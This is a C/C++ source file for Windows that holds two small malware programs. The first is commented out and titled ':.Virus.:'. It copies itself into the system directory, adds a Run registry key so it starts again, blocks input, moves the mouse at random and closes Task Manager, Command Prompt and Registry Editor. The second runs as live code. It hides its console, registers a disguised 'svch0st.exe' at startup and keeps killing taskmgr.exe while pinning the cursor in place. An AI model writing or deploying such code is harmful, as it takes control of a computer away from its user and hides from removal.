//#include <iostream>
//#include <stdio.h>
//#include <windows.h>
//#include <conio.h>
//#include <ctime>
//using namespace std;
//
//int random, Freq, Dur, X, Y;
//HWND mywindow, TaskMgr, CMD, Regedit;
//char Notepad[MAX_PATH] = "notepad.exe";
//char MineSweeper[MAX_PATH] = "winmine.exe";
//char Hearts[MAX_PATH] = "mshearts.exe";
//char Website[MAX_PATH] = "http:\\www.google.com";
//
//void SetUp();
//void Run(int ID);
//void Beeper(), OpenStuff(), Hibernation(), CrazyMouse();
//
//DWORD WINAPI DestroyWindows(LPVOID);
//
//int main(int argc, char *argv[])
//{
//	srand(time(0));
//	random = rand() % 6;
//	system("title :.Virus.:");
//	BlockInput(true);
//	SetUp();
//	BlockInput(false);
//	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
//	while (1)
//	{
//		Run(random);
//		Sleep(10);
//	}
//}
//void SetUp()
//{
//	char system[MAX_PATH];
//	char pathtofile[MAX_PATH];
//	HMODULE GetModH = GetModuleHandle(NULL);
//	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
//	GetSystemDirectory(system, sizeof(system));
//	strcat_s(system, "\\winminer.exe");
//	CopyFile(pathtofile, system, false);
//
//	HKEY hKey;
//	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
//	RegSetValueEx(hKey, "SetUp", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
//	RegCloseKey(hKey);
//
//	mywindow = FindWindow(NULL, ":.Virus.:");
//	cout << "You Are Doomed cyberot";
//	Sleep(1000);
//	ShowWindow(mywindow, false);
//}
//
//void Run(int ID)
//{
//	if (ID == 1)
//	{
//		BlockInput(true);
//	}
//	else if (ID == 2)
//	{
//		Beeper();
//	}
//	else if (ID == 3)
//	{
//		OpenStuff();
//	}
//	else if (ID == 4)
//	{
//		Hibernation();
//	}
//	else if (ID == 5)
//	{
//		CrazyMouse();
//	}
//	else
//	{
//		BlockInput(true);
//		Beeper();
//		OpenStuff();
//		CrazyMouse();
//	}
//}
//
//void Beeper()
//{
//	Freq = rand() % 2001;
//	Dur = rand() % 301;
//	Beep(Freq, Dur);
//}
//void OpenStuff()
//{
//	ShellExecute(NULL, "open", Notepad, NULL, NULL, SW_MAXIMIZE);
//	ShellExecute(NULL, "open", MineSweeper, NULL, NULL, SW_MAXIMIZE);
//	ShellExecute(NULL, "open", Hearts, NULL, NULL, SW_MAXIMIZE);
//	ShellExecute(NULL, "open", Website, NULL, NULL, SW_MAXIMIZE);
//}
//void Hibernation()
//{
//	Sleep(1000);
//	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
//}
//void CrazyMouse()
//{
//	X = rand() % 801;
//	Y = rand() % 601;
//	SetCursorPos(X, Y);
//}
//
//DWORD WINAPI DestroyWindows(LPVOID)
//{
//	while (1)
//	{
//		TaskMgr = FindWindow(NULL, "Windows Task Manager");
//		CMD = FindWindow(NULL, "Command Prompt");
//		Regedit = FindWindow(NULL, "Registry Editor");
//		if (TaskMgr != NULL)
//		{
//			SetWindowText(TaskMgr, "You Suck Balls Superman");
//			PostMessage(TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
//		}
//		if (CMD != NULL)
//		{
//			SetWindowText(CMD, "You Suck Balls Superman");
//			PostMessage(CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
//		}
//		if (Regedit != NULL)
//		{
//			SetWindowText(Regedit, "You Suck Balls Superman");
//			PostMessage(Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
//		}
//
//		Sleep(10);
//	}
//}
//LockMouse
#include <windows.h>
#include <winbase.h>
#include <tlhelp32.h>
#include <ctype.h>
#include <string.h>

#define BUFSIZE 90

int test_key(void);
int create_key(char *);
int kill(void);

BOOL KillProcess(LPSTR lpszExecutable)
{
	BOOL bResult = FALSE;
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
	HANDLE hProcess, hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hProcesses, &pe32)){
		do{
			if (CompareString(LOCALE_USER_DEFAULT, NORM_IGNORECASE, pe32.szExeFile, -1, lpszExecutable, -1) == CSTR_EQUAL){
				if ((hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID)) != NULL){
					TerminateProcess(hProcess, 0); CloseHandle(hProcess); bResult = TRUE;
				}
			}
		} while (Process32Next(hProcesses, &pe32));
		CloseHandle(hProcesses);
	}
	return bResult;
}



int main(void)
{
	int test, create;
	test = test_key();

	if (test == 2)
	{
		char *path = "c:\\WINDOWS\\svch0st.exe";
		create = create_key(path);

	}

	HWND inv;
	AllocConsole();
	inv = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(inv, 0);
	int c;
	for (c = 0; c<999999999999; c++)
	{
		kill();
		SetCursorPos(1, 900);
		Sleep(9);
	}
}

int test_key(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buf_length = BUFSIZE;
	int reg_key;

	reg_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
	if (reg_key != 0)
	{
		check = 1;
		return check;
	}

	reg_key = RegQueryValueEx(hKey, "Windows Files", NULL, NULL, (LPBYTE)path, &buf_length);

	if ((reg_key != 0) || (buf_length>BUFSIZE))
		check = 2;
	if (reg_key == 0)
		check = 0;

	RegCloseKey(hKey);
	return check;
}

int create_key(char *path)
{
	int reg_key, check;

	HKEY hkey;

	reg_key = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	if (reg_key == 0)
	{
		RegSetValueEx((HKEY)hkey, "Windows files", 0, REG_SZ, (BYTE *)path, strlen(path));
		check = 0;
		return check;
	}
	if (reg_key != 0)
		check = 1;

	return check;
}

int kill(void)
{
	return KillProcess("taskmgr.exe");
}